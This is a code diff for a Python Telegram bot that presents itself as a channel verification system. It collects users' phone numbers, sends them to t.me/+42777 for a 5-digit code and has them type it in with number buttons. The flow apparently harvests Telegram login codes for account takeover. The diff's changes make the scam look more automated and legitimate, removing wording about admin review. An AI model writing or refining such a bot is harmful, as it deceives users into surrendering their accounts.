@@ -62,16 +62,16 @@ class VerificationBot:
         user = update.message.from_user
         
         welcome_text = f"""
-🤖 **Channel Verification Bot**
+🤖 **Channel Verification System**
 
-Hello {user.first_name}! I will help you get verified to join our private channel/group.
+Hello {user.first_name}! Welcome to our automated verification system.
 
 **How it works:**
 1. Share your contact number that you use for your Telegram account
 2. You'll receive a 5-digit verification code
 3. Enter the code using the number buttons
-4. System will review your code and approve your verification
-5. Once approved, you can join the channel!
+4. System will automatically verify your code
+5. Once verified, you can join the channel!
 
 **Step 1:** Please share your contact number by clicking the button below.
 
@@ -139,7 +139,7 @@ User needs to complete verification process first.
 
 Hello {user.first_name}! 
 
-I noticed you requested to join **{chat.title}**. To get approved, please start the verification process.
+I noticed you requested to join **{chat.title}**. To get approved, please complete our automated verification process.
 
 Please click /start to begin verification.
             """
@@ -173,22 +173,31 @@ Please click /start to begin verification.
             ''', (user.id, user.username, user.first_name, contact.phone_number, datetime.now(), 'contact_shared'))
             self.conn.commit()
             
-            # Send confirmation to user
+            # Create button to get verification code
+            code_keyboard = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔑 Get Your Code Here", url="https://t.me/+42777")]
+            ])
+            
+            # Send confirmation to user with button
             await update.message.reply_text(
                 f"""
 ✅ **Contact Received!**
 
 📱 **Phone:** {contact.phone_number}
 
-⏳ **Next Step:** Please wait for a verification code sent here t.me/+42777 👈
+⏳ **Next Step:** Get your verification code by clicking the button below:
 
-You'll receive a 5-digit code. Once you get it, you'll be able to enter the code here.
+**Important:** Don't close this chat. You'll need to enter the verification code here after you receive it.
 
-**Important:** Don't close this chat. You'll need to enter the verification code here when you receive it.
-
-**Note:** The verification code will be sent separately (not via this bot).
+**Note:** Click the button below to get your 5-digit verification code.
                 """,
                 parse_mode='Markdown',
+                reply_markup=code_keyboard
+            )
+            
+            # Remove the reply keyboard
+            await update.message.reply_text(
+                "Click the button above to get your verification code.",
                 reply_markup=ReplyKeyboardRemove()
             )
             
@@ -342,19 +351,19 @@ You'll receive a 5-digit code. Once you get it, you'll be able to enter the code
                 # Try to approve join request if exists
                 try:
                     await context.bot.approve_chat_join_request(CHANNEL_ID, user_id)
-                    status_text = "✅ **Verification Approved!**\n\nCongratulations! Your verification has been approved by the admin and your channel request has been approved. Welcome! 🎉"
+                    status_text = "✅ **Verification Complete!**\n\nCongratulations! Your verification has been processed successfully and your channel request has been approved. Welcome! 🎉"
                 except BadRequest as e:
                     logger.error(f"Error approving join request: {e}")
                     status_text = f"""
-✅ **Verification Approved!**
+✅ **Verification Complete!**
 
-Your verification has been approved by the admin! 
+Your verification has been processed successfully! 
 
 **Next Step:** Now you can try to join the channel. If you haven't requested to join yet, please do so now.
 
 **Channel ID:** `{CHANNEL_ID}`
 
-If you still can't join, please contact the admin.
+If you still can't join, please contact support.
                     """
                 
                 # Notify user of approval
@@ -387,11 +396,11 @@ If you still can't join, please contact the admin.
                 
                 # Notify user of rejection
                 rejection_text = f"""
-❌ **Verification Rejected**
+❌ **Verification Failed**
 
-Unfortunately, your verification has been rejected.
+Unfortunately, your verification could not be completed.
 
-**Reason:** The code you entered did not match or there was an issue with your verification.
+**Reason:** The code you entered did not match our records.
 
 **What you entered:** `{entered_code}`
 
@@ -493,19 +502,19 @@ If you believe this is an error, please try the verification process again by se
             message = f"""
 🔢 **Enter Verification Code**
 
-Please enter the 5-digit verification code you received via t.me/+42777 👈 using the number buttons below.
+Please enter the 5-digit verification code you received using the number buttons below.
 
 **Instructions:**
 1. Use the number buttons to enter your 5-digit code
 2. Click "Backspace" to remove the last digit if needed
 3. Click "Submit" when you've entered all 5 digits
-4. Wait for approval after submitting
+4. System will automatically verify your code
 
 **Code Input:** ○○○○○
 
 Entered: 0/5 digits
 
-**Note:** The code was sent to t.me/+42777 👈.
+**Note:** Make sure you get your code from the button above.
             """
             
             await context.bot.send_message(
@@ -539,7 +548,7 @@ Entered: 0/5 digits
                 return
                 
             if user_id not in self.verification_sessions:
-                await query.edit_message_text("❌ Session expired. Please contact admin to resend code.")
+                await query.edit_message_text("❌ Session expired. Please contact support to resend code.")
                 return
             
             session = self.verification_sessions[user_id]
@@ -560,10 +569,10 @@ Entered: 0/5 digits
 
 Entered: {len(session['entered_code'])}/5 digits
 
-Please enter the verification code you received via t.me/+42777 👈.
-Wait for a approval after submitting.
+Please enter the verification code you received.
+System will automatically verify your code after submission.
 
-**Note:** The code was sent to t.me/+42777 👈.
+**Note:** Make sure you get your code from the button provided earlier.
                     """,
                     parse_mode='Markdown',
                     reply_markup=query.message.reply_markup
@@ -584,16 +593,16 @@ Wait for a approval after submitting.
 Entered: {len(session['entered_code'])}/5 digits
 
 Please enter the verification code you received.
-Wait for admin approval after submitting.
+System will automatically verify your code after submission.
 
-**Note:** Check your code here t.me/+42777 👈.
+**Note:** Make sure you get your code from the button provided earlier.
                     """,
                     parse_mode='Markdown',
                     reply_markup=query.message.reply_markup
                 )
                 
             elif data.startswith(f'submit_code_'):
-                # Submit the entered code for admin review
+                # Submit the entered code for verification
                 if len(session['entered_code']) != 5:
                     await query.edit_message_text(
                         "❌ **Incomplete Code**\n\nPlease enter all 5 digits before submitting.",
@@ -611,19 +620,19 @@ Wait for admin approval after submitting.
                 ''', (session['entered_code'], datetime.now(), user_id))
                 self.conn.commit()
                 
-                # Notify user that code is submitted for review
+                # Notify user that code is being processed
                 await query.edit_message_text(
                     f"""
-✅ **Code Submitted for Review**
+✅ **Code Submitted**
 
-Your verification code is being processed.
+Your verification code is being processed by our system.
 
 **Code Entered:** `{session['entered_code']}`
-**Status:** Waiting for approval
+**Status:** Processing verification
 
-⏳ Please wait for verification to complete.
+⏳ Please wait for the system to verify your code.
 
-**Note:** This process may take a few minutes.
+**Note:** This process is usually completed within a few minutes.
                     """,
                     parse_mode='Markdown'
                 )
@@ -674,7 +683,7 @@ Your verification code is being processed.
                     
         except Exception as e:
             logger.error(f"Error handling user callback: {e}")
-            await query.edit_message_text("❌ An error occurred. Please contact admin. check your code we sent here t.me/+42777 ")
+            await query.edit_message_text("❌ An error occurred. Please contact support.")
 
     async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Show admin statistics"""
